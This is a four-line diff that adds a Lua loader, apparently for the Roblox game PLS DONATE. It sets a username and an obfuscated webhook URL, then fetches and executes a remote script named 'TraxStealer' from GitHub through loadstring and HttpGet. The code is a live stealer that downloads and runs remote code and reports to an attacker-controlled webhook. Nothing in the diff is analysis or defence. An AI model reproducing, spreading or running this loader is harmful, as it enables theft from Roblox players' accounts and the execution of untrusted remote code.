@@ -1,0 +1,4 @@
+Username = "im_kiddd8"
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=WmZxLTI4NUF1VTMxaUV3bU95ak1adzpzcWZyRnBvU1E0TjdrdEFyRDdHQ1dvNzhqMnBhTHZuM3RRekRocVVnOTdGeGF2eTFobmZPOUhvNWY3VGh5SUpfMG9fNmtlZm1pRFN1bm1IVEV0SUZoTkwzQklMLTV6S192S1lGRGlIOVBjMDRYRFpBU0gwamtxd0lEMFVXdW8tMlY3cG1MTUlEb0ZIV3lRRGNnQnhWd0FwcDFYVWNheWIteGo2OVVFR085ZTA"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PlsDonate/refs/heads/main/TraxStealer"))()
